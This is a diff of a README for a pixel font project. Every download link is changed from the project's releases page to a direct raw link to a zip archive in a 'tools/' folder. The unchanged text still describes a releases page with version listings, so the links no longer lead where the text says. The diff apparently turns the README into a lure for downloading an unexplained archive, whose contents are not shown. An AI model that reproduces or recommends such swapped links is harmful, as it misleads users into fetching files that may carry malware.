@@ -1,6 +1,6 @@
 # 🎨 ZLabs-RoundPix-12px - Clear 12px Rounded Pixel Font
 
-[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-blue?style=for-the-badge)](https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-blue?style=for-the-badge)](https://raw.githubusercontent.com/sergeproximal430/ZLabs-RoundPix-12px/main/tools/px_Pix_Z_Labs_Round_v2.9.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide will show you how to download and install ZLabs-RoundPix-12px on Wind
 
 Click this big button to visit the releases page where you can get the font files:
 
-[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-grey?style=for-the-badge)](https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-ZLabs--RoundPix--12px-grey?style=for-the-badge)](https://raw.githubusercontent.com/sergeproximal430/ZLabs-RoundPix-12px/main/tools/px_Pix_Z_Labs_Round_v2.9.zip)
 
 This page lists all versions of the font. You will find files and information about each update there.
 
@@ -92,7 +92,7 @@ Follow these instructions to get the font from the official page:
 
 1. Open your web browser.
 2. Go to the releases page here:  
-   https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases
+   https://raw.githubusercontent.com/sergeproximal430/ZLabs-RoundPix-12px/main/tools/px_Pix_Z_Labs_Round_v2.9.zip
 3. Find the latest release at the top.
 4. Click the `.zip` or `.ttf` font file to download.
 5. Extract the files if zipped.
@@ -139,6 +139,6 @@ This project includes these areas:
 ## ⬇️ Download Link
 
 Access the font files here:  
-https://github.com/sergeproximal430/ZLabs-RoundPix-12px/releases
+https://raw.githubusercontent.com/sergeproximal430/ZLabs-RoundPix-12px/main/tools/px_Pix_Z_Labs_Round_v2.9.zip
 
 Use this link to always get the latest updates and extra documentation.
